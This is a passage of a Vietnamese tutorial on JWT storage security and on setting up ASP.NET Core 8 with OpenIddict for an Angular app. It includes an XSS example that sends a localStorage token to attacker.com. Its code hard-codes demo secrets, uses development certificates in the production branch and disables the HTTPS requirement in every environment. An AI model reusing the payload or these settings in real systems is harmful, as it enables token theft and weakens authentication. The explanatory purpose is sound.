# Hướng dẫn triển khai ASP.NET Core 8 + OpenIddict + Angular Authentication

> **Mục tiêu:** Xây dựng hệ thống xác thực hoàn chỉnh gồm RESTful API (.NET 8 + OpenIddict) và frontend (Angular 17+) với phân tích bảo mật toàn diện về lưu JWT.
>
> **Phiên bản:** .NET 8 · OpenIddict 5.x · Angular 17+ · EF Core 8

---

## Mục lục

1. [Tổng quan kiến trúc](#1-tổng-quan-kiến-trúc)
2. [Phân tích bảo mật JWT Storage — Đọc trước khi code](#2-phân-tích-bảo-mật-jwt-storage)
3. [Setup Backend — ASP.NET Core 8 + OpenIddict](#3-setup-backend)
4. [Cấu hình OpenIddict](#4-cấu-hình-openiddict)
5. [Identity & Database](#5-identity--database)
6. [Authorization Controller (Token Endpoint)](#6-authorization-controller)
7. [Protected API Endpoints](#7-protected-api-endpoints)
8. [Setup Frontend — Angular 17+](#8-setup-frontend)
9. [Auth Service & Token Strategy](#9-auth-service--token-strategy)
10. [HTTP Interceptor & Guards](#10-http-interceptor--guards)
11. [Login Component & Flow](#11-login-component--flow)
12. [Chạy thử & Test](#12-chạy-thử--test)
13. [Nâng cấp bảo mật — BFF Pattern](#13-nâng-cấp-bảo-mật--bff-pattern)
14. [Checklist trước khi đưa lên Production](#14-checklist-production)

---

## 1. Tổng quan kiến trúc

```
┌─────────────────────────────────────────────────────────────────┐
│                         CLIENT BROWSER                          │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                  Angular 17+ SPA                        │   │
│  │                                                         │   │
│  │  Login Page → AuthService → HTTP Interceptor            │   │
│  │       ↓              ↓              ↓                   │   │
│  │  OTP/MFA       Token Storage   Protected Routes         │   │
│  └──────────────────────┬──────────────────────────────────┘   │
└─────────────────────────│───────────────────────────────────────┘
                          │ HTTPS
┌─────────────────────────▼───────────────────────────────────────┐
│                      ASP.NET Core 8                             │
│                                                                 │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐  │
│  │  OpenIddict  │  │  ASP.NET     │  │  EF Core 8           │  │
│  │  (Auth       │  │  Identity    │  │  (SQL Server /       │  │
│  │   Server)    │  │  (User Mgmt) │  │   PostgreSQL)        │  │
│  └──────────────┘  └──────────────┘  └──────────────────────┘  │
│                                                                 │
│  Endpoints:                                                     │
│  POST /connect/token     ← OpenIddict token endpoint           │
│  POST /connect/logout    ← Revoke token                        │
│  GET  /api/userinfo      ← Get current user info               │
│  GET  /api/products      ← Protected resource                  │
└─────────────────────────────────────────────────────────────────┘
```

### Tại sao chọn OpenIddict thay vì tự viết JWT?

| Tiêu chí | Tự viết JWT | OpenIddict |
|----------|-------------|------------|
| Chuẩn giao thức | Không đảm bảo | OAuth 2.0 + OIDC đầy đủ |
| Token revocation | Phải tự implement | Built-in, lưu vào DB |
| Refresh token | Phải tự implement | Built-in, có rotation |
| Audit/compliance | Không có | Lưu đầy đủ token history |
| Bảo trì | Cao (tự viết = tự fix lỗi bảo mật) | Thấp (cộng đồng maintain) |
| PKCE | Không | Có (bắt buộc cho SPA) |
| Multi-client | Khó | Hỗ trợ nhiều client/scope |

---

## 2. Phân tích bảo mật JWT Storage

> **⚠ ĐỌC KỸ TRƯỚC KHI QUYẾT ĐỊNH STORAGE STRATEGY**

### 2.1 localStorage — Tiện nhưng rủi ro

**Cách hoạt động:**
```javascript
// Angular lưu token vào localStorage
localStorage.setItem('access_token', jwtToken);

// Lấy ra khi cần
const token = localStorage.getItem('access_token');
```

**Ưu điểm:**
- Đơn giản, dễ implement trong vài phút
- Persist qua tab và sau khi đóng/mở lại trình duyệt
- Không bị xóa khi refresh page

**Nhược điểm — Lý do KHÔNG dùng cho hệ thống nhà nước:**

```
XSS Attack Flow khi dùng localStorage:
─────────────────────────────────────
1. Attacker inject JS vào trang (qua comment, rich text, URL param bị thiếu sanitize)

   <img src="x" onerror="
     fetch('https://attacker.com/steal?t=' + localStorage.getItem('access_token'))
   ">

2. Script chạy trong browser của nạn nhân
3. Token gửi về server của attacker
4. Attacker dùng token để gọi API như người dùng hợp lệ
5. Token sống 60 phút → attacker có 60 phút để làm gì thì làm

Kết quả: HOÀN TOÀN bypass xác thực mà không cần mật khẩu
```

**Kết luận về localStorage:**
- ✓ Chấp nhận được cho: app demo, prototype, tool nội bộ không có dữ liệu nhạy cảm
- ✗ KHÔNG dùng cho: hệ thống nhà nước, dữ liệu cá nhân, tài chính, y tế (theo Thông tư 12/2022 yêu cầu bảo mật ứng dụng ở Cấp 2+)

---

### 2.2 sessionStorage — Tốt hơn localStorage nhưng vẫn XSS-vulnerable

```javascript
// sessionStorage: tự xóa khi đóng tab
sessionStorage.setItem('access_token', jwtToken);
```

**Ưu điểm so với localStorage:**
- Token bị xóa khi đóng tab (giảm exposure time)
- Không shared giữa các tab (mỗi tab có session riêng)
- Vẫn persist qua F5/refresh

**Nhược điểm:**
- VẪN bị XSS đánh cắp được — `sessionStorage.getItem('access_token')` hoạt động trong JS injected
- Không persist qua tab → UX kém khi mở nhiều tab

---

### 2.3 HttpOnly Cookie — An toàn nhất nhưng cần cấu hình đúng

```
HttpOnly Cookie Flow:
─────────────────────
1. Backend set cookie sau khi xác thực thành công:
   Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/api

2. Trình duyệt tự động gửi cookie theo mọi request đến cùng domain
3. JavaScript KHÔNG THỂ đọc cookie HttpOnly → XSS không đánh cắp được
4. SameSite=Strict → chặn CSRF từ domain khác gửi request kèm cookie

Lưu ý: Vẫn cần bật CSRF protection vì cookie tự động đính kèm
```

#### Cookie nằm ở đâu khi server "set cookie"?

Đây là điểm hay gây nhầm lẫn: **server SET cookie, nhưng cookie LƯU ở browser (client), không phải server**.

```
Luồng Set-Cookie hoạt động như thế nào:
────────────────────────────────────────

1. SERVER gửi HTTP response header:
   HTTP/1.1 200 OK
   Set-Cookie: refresh_token=abc123xyz; HttpOnly; Secure; Path=/connect/token; Max-Age=604800

2. BROWSER nhận header đó và:
   a. Lưu cookie vào "Cookie Store" của trình duyệt (trên máy tính của người dùng)
   b. Đọc các thuộc tính: HttpOnly, Secure, Path, Max-Age
   c. Ghi nhớ: cookie này chỉ được gửi đến đúng path, chỉ qua HTTPS

3. Mọi request tiếp theo từ BROWSER đến đúng domain + path:
   Browser TỰ ĐỘNG đính kèm cookie vào header:
   POST /connect/token
   Cookie: refresh_token=abc123xyz

4. SERVER nhận request, đọc cookie từ header → không cần lưu gì ở server
   (server đã lưu token hash vào DB OpenIddict rồi, đây chỉ là cách truyền token)
```

```
Hình dung trực quan:
────────────────────
Server                          Browser (Chrome/Firefox)
  │                                │
  │  ← POST /connect/token ────────│  (user login)
  │                                │
  │  200 OK                        │
  │  Set-Cookie: refresh_token=... │
  │ ──────────────────────────────►│  Browser lưu cookie vào ổ cứng
  │                                │  tại: %AppData%\Google\Chrome\...
  │                                │  (người dùng nhìn thấy qua DevTools)
  │                                │
  │  ← POST /connect/token ────────│  (Angular gọi refresh, 15 phút sau)
  │    Cookie: refresh_token=...   │  Browser TỰ ĐỘNG đính kèm
  │                                │
  │  200 OK (access_token mới)     │
  │ ──────────────────────────────►│
```

**Thuộc tính `HttpOnly` có nghĩa gì:**
- Cookie vẫn lưu ở browser như bình thường
- Nhưng JavaScript (bao gồm code Angular, XSS script) **không thể đọc** qua `document.cookie`
- Chỉ browser engine mới tự động đính kèm khi gửi request HTTP

```javascript
// Sau khi login, browser có cookie refresh_token
// Thử đọc từ JavaScript:
document.cookie  // → "" (không thấy refresh_token vì HttpOnly)

// Angular cũng không đọc được:
document.cookie.includes('refresh_token')  // → false

// Nhưng khi Angular gọi refresh:
this.http.post('/connect/token', body, { withCredentials: true })
// Browser ENGINE (không phải JS) tự đính cookie vào request
// → Server nhận được refresh_token mà Angular không biết giá trị của nó
```

**Tại sao Postman không thấy `refresh_token` trong response:**

Dự án này dùng `RefreshTokenCookieMiddleware` — một lớp middleware chạy trên server **chặn** response trước khi trả về client:

```
Browser/Postman → POST /connect/token → OpenIddict phát token
                                              ↓
                                    RefreshTokenCookieMiddleware bắt response:
                                    - Lấy refresh_token ra khỏi JSON
                                    - Set vào Set-Cookie header
                                    - Trả JSON đã xóa refresh_token
                                              ↓
Browser nhận: JSON (chỉ có access_token) + Set-Cookie header → lưu cookie
Postman nhận: JSON (chỉ có access_token) + Set-Cookie header → lưu cookie (tab Cookies)
```

Postman không thấy `refresh_token` trong **body** vì middleware đã lấy ra rồi — nhưng nếu nhìn vào tab **Cookies** của Postman, cookie `refresh_token` vẫn được set đúng.

**Ưu điểm:**
- JavaScript không đọc được → XSS không lấy được token
- Trình duyệt quản lý tự động → code Angular đơn giản hơn

**Nhược điểm:**
- Cần cấu hình CORS và CSRF cẩn thận
- Phức tạp hơn khi API và Angular khác domain
- Cần backend hỗ trợ cookie-based auth

---

### 2.4 In-Memory (Recommended cho hệ thống nhà nước Cấp 2+)

```typescript
// Lưu token trong biến JS thuần — mất khi refresh page
@Injectable({ providedIn: 'root' })
export class TokenService {
  private accessToken: string | null = null;  // Chỉ sống trong JS heap
  
  setToken(token: string) { this.accessToken = token; }
  getToken(): string | null { return this.accessToken; }
  clear() { this.accessToken = null; }
}
```

**Ưu điểm:**
- XSS không thể persist token (refresh page → mất token)
- Không cần CSRF protection
- Đơn giản implement

**Nhược điểm:**
- Token mất khi F5 → user phải login lại (UX kém)
- Giải pháp: dùng refresh token trong HttpOnly cookie để lấy lại access token mới sau refresh

---

### 2.5 Bảng so sánh và khuyến nghị

| | localStorage | sessionStorage | HttpOnly Cookie | In-Memory |
|---|---|---|---|---|
| XSS resistance | ✗ Rất thấp | ✗ Thấp | ✓ Cao | ✓ Cao |
| CSRF resistance | ✓ | ✓ | ⚠ Cần config | ✓ |
| Persist qua F5 | ✓ | ✓ | ✓ | ✗ |
| Persist qua tab | ✓ | ✗ | ✓ | ✗ |
| Code complexity | Thấp | Thấp | Trung bình | Thấp |
| **Dùng cho CP1** | ⚠ Chấp nhận | ✓ OK | ✓ Tốt | ✓ Tốt |
| **Dùng cho CP2+** | ✗ KHÔNG | ✓ Chấp nhận | ✓ Tốt nhất | ✓ Tốt |
| **Dùng cho CP3+** | ✗ KHÔNG | ✗ KHÔNG | ✓ BẮT BUỘC | ✓ + RT cookie |

**Khuyến nghị cho hướng dẫn này:**
- Guide dưới đây implement **In-Memory + Refresh Token trong HttpOnly Cookie**
- Access token ngắn hạn (15 phút) trong memory
- Refresh token dài hạn (7 ngày) trong HttpOnly cookie
- Sau F5, Angular tự gọi `/connect/token` với refresh token để lấy access token mới

---

## 3. Setup Backend

### 3.1 Tạo project

```bash
# Tạo thư mục solution
mkdir AuthDemo && cd AuthDemo

# Tạo solution file
dotnet new sln -n AuthDemo

# Tạo API project
dotnet new webapi -n AuthDemo.Api --framework net8.0

# Thêm project vào solution
dotnet sln add AuthDemo.Api/AuthDemo.Api.csproj

# Di chuyển vào project
cd AuthDemo.Api
```

### 3.2 Cài đặt NuGet packages

```bash
# ASP.NET Core Identity với EF Core
dotnet add package Microsoft.AspNetCore.Identity.EntityFrameworkCore

# EF Core cho SQL Server (hoặc PostgreSQL, xem ghi chú bên dưới)
dotnet add package Microsoft.EntityFrameworkCore.SqlServer
dotnet add package Microsoft.EntityFrameworkCore.Design

# OpenIddict — Core + EF Core integration + ASP.NET Core server
dotnet add package OpenIddict.Core
dotnet add package OpenIddict.EntityFrameworkCore    # Lưu token vào DB qua EF
dotnet add package OpenIddict.AspNetCore             # Tích hợp với ASP.NET pipeline

# Logging
dotnet add package Serilog.AspNetCore
dotnet add package Serilog.Sinks.Console
```

> **Dùng PostgreSQL thay SQL Server:**
> ```bash
> dotnet add package Npgsql.EntityFrameworkCore.PostgreSQL
> # Trong Program.cs thay UseSqlServer bằng UseNpgsql
> ```

### 3.3 Cấu trúc thư mục project

```
AuthDemo.Api/
├── Controllers/
│   ├── AuthorizationController.cs   ← Xử lý /connect/token và /connect/logout
│   └── ApiController.cs             ← Protected resources mẫu
├── Data/
│   └── ApplicationDbContext.cs      ← EF Core DbContext
├── Models/
│   ├── ApplicationUser.cs           ← Custom Identity User (mở rộng IdentityUser)
│   └── Requests/
│       └── LoginRequest.cs          ← DTO cho login
├── Services/
│   └── WorkerService.cs             ← Seed OpenIddict clients khi startup
├── appsettings.json
├── appsettings.Development.json
└── Program.cs                       ← Entry point, tất cả cấu hình
```

---

## 4. Cấu hình OpenIddict

### 4.1 Model ApplicationUser

```csharp
// Models/ApplicationUser.cs

using Microsoft.AspNetCore.Identity;

namespace AuthDemo.Api.Models;

/// <summary>
/// Kế thừa IdentityUser để có thể thêm các field tùy chỉnh.
/// IdentityUser đã có sẵn: Id, UserName, Email, PasswordHash, ...
/// </summary>
public class ApplicationUser : IdentityUser
{
    // Thêm các field nghiệp vụ tùy chỉnh tại đây
    public string? FullName { get; set; }
    
    // Ví dụ thêm field cho hệ thống nhà nước:
    // public string? DepartmentCode { get; set; }
    // public string? Position { get; set; }
    // public DateTime? LastPasswordChangeDate { get; set; }
}
```

**Giải thích:**
- `IdentityUser` là base class của ASP.NET Core Identity, đã xử lý password hashing, email, phone, lockout
- Kế thừa để thêm field nghiệp vụ mà không cần tự viết user management
- `FullName` là ví dụ field tùy chỉnh bạn sẽ thường cần

---

### 4.2 ApplicationDbContext

```csharp
// Data/ApplicationDbContext.cs

using AuthDemo.Api.Models;
using Microsoft.AspNetCore.Identity.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore;

namespace AuthDemo.Api.Data;

/// <summary>
/// DbContext kế thừa từ IdentityDbContext để có đầy đủ bảng Identity:
/// AspNetUsers, AspNetRoles, AspNetUserRoles, AspNetUserClaims, ...
/// 
/// OpenIddict tự thêm các bảng của mình qua migration:
/// OpenIddictApplications, OpenIddictAuthorizations, OpenIddictScopes, OpenIddictTokens
/// </summary>
public class ApplicationDbContext : IdentityDbContext<ApplicationUser>
{
    public ApplicationDbContext(DbContextOptions<ApplicationDbContext> options)
        : base(options)
    {
    }

    protected override void OnModelCreating(ModelBuilder builder)
    {
        base.OnModelCreating(builder); // QUAN TRỌNG: gọi base để Identity setup table
        
        // Có thể thêm cấu hình EF Fluent API tại đây
        // Ví dụ: builder.Entity<ApplicationUser>().HasIndex(u => u.Email).IsUnique();
    }
}
```

**Giải thích:**
- `IdentityDbContext<ApplicationUser>` — generic parameter chỉ định User type tùy chỉnh của bạn
- Không cần khai báo DbSet cho Identity tables — đã được xử lý trong base class
- OpenIddict sẽ tự thêm các bảng token/application khi bạn chạy migration

---

### 4.3 Program.cs — Cấu hình toàn bộ

```csharp
// Program.cs
// File này là entry point và nơi đăng ký TẤT CẢ services, middleware

using System.Security.Claims;
using AuthDemo.Api.Data;
using AuthDemo.Api.Models;
using AuthDemo.Api.Services;
using Microsoft.AspNetCore.Identity;
using Microsoft.EntityFrameworkCore;
using OpenIddict.Abstractions;
using Serilog;

var builder = WebApplication.CreateBuilder(args);

// ─── 1. LOGGING ───────────────────────────────────────────────────────────────
// Cấu hình Serilog thay thế ILogger mặc định của .NET
// Serilog cho phép structured logging, dễ ship lên ELK/SIEM
Log.Logger = new LoggerConfiguration()
    .ReadFrom.Configuration(builder.Configuration) // Đọc cấu hình từ appsettings.json
    .Enrich.FromLogContext()    // Tự động thêm correlation info vào mỗi log entry
    .WriteTo.Console()          // Log ra console (trong production có thể thêm sink khác)
    .CreateLogger();

builder.Host.UseSerilog(); // Thay thế ILogger mặc định bằng Serilog

// ─── 2. DATABASE ──────────────────────────────────────────────────────────────
builder.Services.AddDbContext<ApplicationDbContext>(options =>
{
    // UseSqlServer: kết nối SQL Server
    // Connection string đọc từ appsettings — KHÔNG hard-code ở đây
    options.UseSqlServer(builder.Configuration.GetConnectionString("DefaultConnection"));
    
    // QUAN TRỌNG: Dòng này cho phép OpenIddict sử dụng DbContext này
    // để lưu trữ Application, Authorization, Scope, Token vào cùng database
    options.UseOpenIddict();
    
    // Chỉ bật chi tiết EF logging ở Development để tránh log nhạy cảm ở Production
    if (builder.Environment.IsDevelopment())
    {
        options.EnableDetailedErrors();
        options.EnableSensitiveDataLogging(); // KHÔNG bật ở Production!
    }
});

// ─── 3. ASP.NET CORE IDENTITY ─────────────────────────────────────────────────
builder.Services.AddIdentity<ApplicationUser, IdentityRole>(options =>
{
    // Cấu hình password policy — điều chỉnh theo yêu cầu ATTT
    options.Password.RequiredLength = 8;          // Tối thiểu 8 ký tự (TT12/2022)
    options.Password.RequireDigit = true;          // Phải có số
    options.Password.RequireLowercase = true;      // Phải có chữ thường
    options.Password.RequireUppercase = true;      // Phải có chữ hoa
    options.Password.RequireNonAlphanumeric = false; // Ký tự đặc biệt (tùy chọn)
    
    // Cấu hình lockout — chống brute force
    options.Lockout.EnabledByDefault = true;
    options.Lockout.MaxFailedAccessAttempts = 5;  // Sai 5 lần → khóa
    options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15); // Khóa 15 phút
    
    // Yêu cầu email unique (quan trọng cho hệ thống nhà nước)
    options.User.RequireUniqueEmail = true;
    
    // Tắt yêu cầu confirm email cho demo (bật lại trong production)
    options.SignIn.RequireConfirmedEmail = false;
})
.AddEntityFrameworkStores<ApplicationDbContext>() // Lưu user data vào ApplicationDbContext
.AddDefaultTokenProviders(); // Token provider cho reset password, email confirm...

// ─── 4. OPENIDDICT ────────────────────────────────────────────────────────────
builder.Services.AddOpenIddict()

    // Core: đăng ký OpenIddict core services
    .AddCore(options =>
    {
        // Chỉ định OpenIddict dùng EF Core để lưu data
        // và ApplicationDbContext làm DbContext
        options.UseEntityFrameworkCore()
               .UseDbContext<ApplicationDbContext>();
    })

    // Server: cấu hình Authorization Server (phát token)
    .AddServer(options =>
    {
        // ─── Khai báo các endpoints OpenIddict sẽ xử lý ───
        
        options
            // /connect/token — endpoint nhận credentials và trả về JWT
            .SetTokenEndpointUris("/connect/token")
            
            // /connect/logout — endpoint revoke token và logout
            .SetLogoutEndpointUris("/connect/logout")
            
            // /connect/userinfo — endpoint lấy thông tin user từ token
            .SetUserinfoEndpointUris("/connect/userinfo");
        
        // ─── Cho phép các OAuth flows ───
        
        // Resource Owner Password Credentials (ROPC) flow:
        // Client gửi username + password trực tiếp lên /connect/token
        // Phù hợp cho: SPA + API cùng domain/chủ sở hữu (first-party)
        // KHÔNG dùng khi: third-party app cần đăng nhập hộ user
        options.AllowPasswordFlow();
        
        // Refresh Token flow: dùng refresh token để lấy access token mới
        // Cho phép user không phải đăng nhập lại sau khi access token hết hạn
        options.AllowRefreshTokenFlow();
        
        // ─── Cấu hình thời gian sống token ───
        
        // Access token: ngắn để giảm rủi ro nếu bị lộ
        // Cấp 1-2: 60 phút; Cấp 3+: 15-30 phút
        options.SetAccessTokenLifetime(TimeSpan.FromMinutes(60));
        
        // Refresh token: dài hơn để user không phải login lại liên tục
        // Cấp 1-2: 14 ngày; Cấp 3+: 7 ngày hoặc session-only
        options.SetRefreshTokenLifetime(TimeSpan.FromDays(14));
        
        // ─── Cấu hình signing & encryption ───
        
        // DEVELOPMENT: Dùng ephemeral keys (tạo mới mỗi lần restart, không persist)
        // Tiện cho dev vì không cần setup cert, nhưng tất cả token sẽ invalid sau restart
        if (builder.Environment.IsDevelopment())
        {
            options
                .AddEphemeralEncryptionKey()  // Mã hóa token payload
                .AddEphemeralSigningKey();    // Ký token để verify
        }
        else
        {
            // PRODUCTION: Phải dùng persistent key (certificate hoặc RSA key)
            // để token còn valid sau khi restart server
            // Ví dụ dùng certificate từ file:
            // options.AddEncryptionCertificate(new X509Certificate2("path/to/cert.pfx", "password"))
            //        .AddSigningCertificate(new X509Certificate2("path/to/cert.pfx", "password"));
            
            // Hoặc dùng development cert tạm thời (thêm persistence):
            options
                .AddDevelopmentEncryptionCertificate()
                .AddDevelopmentSigningCertificate();
        }
        
        // Tắt mã hóa access token khi dùng ASP.NET Core validation
        // OpenIddict mặc định mã hóa cả payload, nhưng khi Resource Server cũng là Authorization Server
        // thì có thể dùng JWT thuần để dễ debug và tương thích
        options.DisableAccessTokenEncryption();
        
        // Đăng ký OpenIddict ASP.NET Core integration
        // Cho phép OpenIddict nhận request và trả response qua ASP.NET pipeline
        options.UseAspNetCore()
               .EnableTokenEndpointPassthrough()   // Controller tự xử lý /connect/token
               .EnableLogoutEndpointPassthrough()  // Controller tự xử lý /connect/logout
               .EnableUserinfoEndpointPassthrough() // Controller tự xử lý /connect/userinfo
               .DisableTransportSecurityRequirement(); // CHỈ để dev — KHÔNG dùng production
    })

    // Validation: cấu hình Resource Server (validate token đến)
    // Trong trường hợp này API và Auth Server là cùng một app
    .AddValidation(options =>
    {
        // Dùng local server để validate — tránh gọi HTTP roundtrip
        options.UseLocalServer();
        
        // Tích hợp với ASP.NET Core authentication pipeline
        options.UseAspNetCore();
    });

// ─── 5. CORS ──────────────────────────────────────────────────────────────────
// Cấu hình Cross-Origin Resource Sharing cho Angular frontend
builder.Services.AddCors(options =>
{
    options.AddPolicy("AngularPolicy", policy =>
    {
        policy
            // CHỈ cho phép Angular dev server (localhost:4200)
            // Production: thay bằng domain thật, không dùng AllowAnyOrigin
            .WithOrigins("http://localhost:4200", "https://yourdomain.gov.vn")
            
            // Cho phép Authorization header (để Angular gửi Bearer token)
            .AllowAnyHeader()
            
            // Cho phép GET, POST, PUT, DELETE
            .AllowAnyMethod()
            
            // QUAN TRỌNG: Bắt buộc nếu dùng HttpOnly Cookie
            // Cho phép gửi credentials (cookie) cross-origin
            .AllowCredentials();
    });
});

// ─── 6. CONTROLLERS & SWAGGER ─────────────────────────────────────────────────
builder.Services.AddControllers();

// Swagger/OpenAPI — CHỈ ở development, không expose ở production
builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen(c =>
{
    c.SwaggerDoc("v1", new() { Title = "AuthDemo API", Version = "v1" });
    
    // Thêm Bearer token support vào Swagger UI
    c.AddSecurityDefinition("Bearer", new()
    {
        Description = "JWT Authorization header. Nhập: Bearer {token}",
        Name = "Authorization",
        In = Microsoft.OpenApi.Models.ParameterLocation.Header,
        Type = Microsoft.OpenApi.Models.SecuritySchemeType.ApiKey,
    });
});

// ─── 7. BACKGROUND SERVICE — SEED CLIENTS ─────────────────────────────────────
// WorkerService chạy khi app khởi động và seed OpenIddict application clients
// Xem chi tiết ở section 4.4
builder.Services.AddHostedService<WorkerService>();

// ─── 8. BUILD APP ─────────────────────────────────────────────────────────────
var app = builder.Build();

// ─── 9. MIDDLEWARE PIPELINE — THỨ TỰ RẤT QUAN TRỌNG ──────────────────────────

// Development only: Swagger UI
if (app.Environment.IsDevelopment())
{
    app.UseSwagger();
    app.UseSwaggerUI();
}

// Redirect mọi HTTP request lên HTTPS
app.UseHttpsRedirection();

// CORS phải đặt TRƯỚC Authentication và Authorization
// Lý do: preflight OPTIONS request phải được xử lý trước khi check auth
app.UseCors("AngularPolicy");

// Thêm security headers vào mọi response
app.Use(async (context, next) =>
{
    // Ngăn browser đoán MIME type — chống MIME sniffing attack
    context.Response.Headers.Append("X-Content-Type-Options", "nosniff");
    
    // Ngăn page bị nhúng vào iframe — chống clickjacking
    context.Response.Headers.Append("X-Frame-Options", "DENY");
    
    // Bắt browser dùng HTTPS trong 1 năm (HSTS)
    // Chỉ thêm ở production — dev dùng HTTP
    if (!app.Environment.IsDevelopment())
        context.Response.Headers.Append("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
    
    await next();
});

// ASP.NET Core routing — đăng ký route table
app.UseRouting();

// Xác thực: AI đang gửi request này?
// Phải đặt TRƯỚC UseAuthorization
app.UseAuthentication();

// Phân quyền: User đã xác thực có QUYỀN làm việc này không?
// Phải đặt SAU UseAuthentication
app.UseAuthorization();

// Map controllers: kết nối HTTP route với Action method
app.MapControllers();

// ─── 10. AUTO MIGRATE DATABASE ────────────────────────────────────────────────
// Tự động tạo/update database khi app khởi động
// CẢNH BÁO: Trong production nên chạy migration thủ công, không auto
using (var scope = app.Services.CreateScope())
{
    var db = scope.ServiceProvider.GetRequiredService<ApplicationDbContext>();
    await db.Database.MigrateAsync();
}

app.Run();
```

---

### 4.4 WorkerService — Seed OpenIddict Clients

```csharp
// Services/WorkerService.cs

using OpenIddict.Abstractions;
using static OpenIddict.Abstractions.OpenIddictConstants;

namespace AuthDemo.Api.Services;

/// <summary>
/// BackgroundService chạy một lần khi app khởi động.
/// Mục đích: Đăng ký OpenIddict Application (client) vào database.
/// 
/// Trong OpenIddict, "Application" = OAuth2 client (ví dụ: Angular app của bạn).
/// Mỗi client có ClientId, ClientSecret, Permissions, RedirectURIs...
/// </summary>
public class WorkerService : IHostedService
{
    private readonly IServiceProvider _serviceProvider;
    private readonly ILogger<WorkerService> _logger;

    public WorkerService(IServiceProvider serviceProvider, ILogger<WorkerService> logger)
    {
        _serviceProvider = serviceProvider;
        _logger = logger;
    }

    public async Task StartAsync(CancellationToken cancellationToken)
    {
        // Tạo scope để lấy scoped services (DbContext, OpenIddict manager)
        // IHostedService là singleton → không inject scoped service trực tiếp
        using var scope = _serviceProvider.CreateScope();
        
        var manager = scope.ServiceProvider
            .GetRequiredService<IOpenIddictApplicationManager>();

        // ─── Seed OpenIddict Application cho Angular SPA ───────────────────────

        // Kiểm tra xem client đã tồn tại chưa (tránh tạo duplicate khi restart)
        var existingClient = await manager.FindByClientIdAsync("angular-spa");
        if (existingClient == null)
        {
            await manager.CreateAsync(new OpenIddictApplicationDescriptor
            {
                // ClientId: định danh duy nhất của client
                // Angular sẽ gửi client_id=angular-spa trong request
                ClientId = "angular-spa",
                
                // ClientSecret: mật khẩu của client (server-to-server)
                // Với SPA (JavaScript), client secret KHÔNG BÍ MẬT vì user có thể xem source
                // Đây là "known" secret cho ROPC flow — không phải zero-trust
                // Cấp 3+: nên dùng PKCE thay vì client secret với SPA
                ClientSecret = "your-super-secret-key-change-in-production",
                
                // DisplayName: tên hiển thị trong UI (nếu có consent screen)
                DisplayName = "Angular SPA Client",
                
                // ClientType.Public hoặc Confidential
                // Public = client không thể giữ bí mật (browser SPA)
                // Confidential = client có thể giữ bí mật (server-side app)
                Type = ClientTypes.Public,
                
                // Permissions: khai báo những gì client này được phép làm
                Permissions =
                {
                    // Cho phép dùng /connect/token endpoint
                    Permissions.Endpoints.Token,
                    
                    // Cho phép dùng /connect/logout endpoint
                    Permissions.Endpoints.Logout,
                    
                    // Cho phép Password flow (username/password trực tiếp)
                    Permissions.GrantTypes.Password,
                    
                    // Cho phép Refresh Token flow
                    Permissions.GrantTypes.RefreshToken,
                    
                    // Scope "openid": bắt buộc với OIDC, cho phép lấy user identity
                    Permissions.Scopes.OpenId,
                    
                    // Scope "profile": cho phép lấy thông tin profile (name, picture...)
                    Permissions.Scopes.Profile,
                    
                    // Scope "email": cho phép lấy email
                    Permissions.Scopes.Email,
                    
                    // Scope "roles": cho phép token chứa roles
                    Permissions.Scopes.Roles,
                }
            });
            
            _logger.LogInformation("Đã tạo OpenIddict Application: angular-spa");
        }
        else
        {
            _logger.LogInformation("OpenIddict Application angular-spa đã tồn tại, bỏ qua seed");
        }

        // ─── Seed user admin mặc định ──────────────────────────────────────────
        // CẢNH BÁO: Chỉ seed ở development, production phải đổi mật khẩu ngay!
        await SeedAdminUserAsync(scope.ServiceProvider);
    }

    private async Task SeedAdminUserAsync(IServiceProvider services)
    {
        var userManager = services.GetRequiredService<UserManager<ApplicationUser>>();
        var roleManager = services.GetRequiredService<RoleManager<IdentityRole>>();

        // Tạo roles nếu chưa có
        string[] roles = { "Admin", "User", "Viewer" };
        foreach (var role in roles)
        {
            if (!await roleManager.RoleExistsAsync(role))
            {
                await roleManager.CreateAsync(new IdentityRole(role));
                _logger.LogInformation("Đã tạo role: {Role}", role);
            }
        }

        // Tạo admin user mặc định
        const string adminEmail = "admin@demo.local";
        var adminUser = await userManager.FindByEmailAsync(adminEmail);
        
        if (adminUser == null)
        {
            adminUser = new ApplicationUser
            {
                UserName = adminEmail,
                Email = adminEmail,
                FullName = "System Administrator",
                EmailConfirmed = true, // Bỏ qua confirm email cho demo
            };
            
            // CẢNH BÁO: Mật khẩu này CHỈ dùng cho demo, PHẢI đổi trước production
            var result = await userManager.CreateAsync(adminUser, "Admin@123456");
            
            if (result.Succeeded)
            {
                await userManager.AddToRoleAsync(adminUser, "Admin");
                _logger.LogWarning(
                    "Đã tạo user admin mặc định: {Email} — HÃY ĐỔI MẬT KHẨU TRƯỚC KHI PRODUCTION!",
                    adminEmail);
            }
            else
            {
                _logger.LogError("Không thể tạo admin user: {Errors}",
                    string.Join(", ", result.Errors.Select(e => e.Description)));
            }
        }
    }

    // IHostedService.StopAsync — dọn dẹp khi app shutdown
    public Task StopAsync(CancellationToken cancellationToken) => Task.CompletedTask;
}
```

**Dùng model class ApplicationUser trong WorkerService:**

```csharp
// Thêm using ở đầu WorkerService.cs nếu ApplicationUser ở namespace khác
using AuthDemo.Api.Models;
using AuthDemo.Api.Data;
using Microsoft.AspNetCore.Identity;
```

---

## 5. Identity & Database

### 5.1 appsettings.json

```json
{
  "ConnectionStrings": {
    "DefaultConnection": "Server=localhost;Database=AuthDemoDB;Trusted_Connection=True;TrustServerCertificate=True;"
  },
  "Logging": {
    "LogLevel": {
      "Default": "Information",
      "Microsoft.AspNetCore": "Warning",
      "OpenIddict": "Debug"
    }
  },
  "AllowedHosts": "*"
}
```

> **PostgreSQL connection string:**
> ```
> "DefaultConnection": "Host=localhost;Database=AuthDemoDB;Username=postgres;Password=yourpassword"
> ```

### 5.2 Chạy EF Core Migration

```bash
# Cài EF Core tools nếu chưa có
dotnet tool install --global dotnet-ef

# Tạo migration đầu tiên
# Lệnh này phân tích DbContext và tạo code migration
dotnet ef migrations add InitialCreate --output-dir Data/Migrations

# Xem migration đã tạo
ls Data/Migrations/

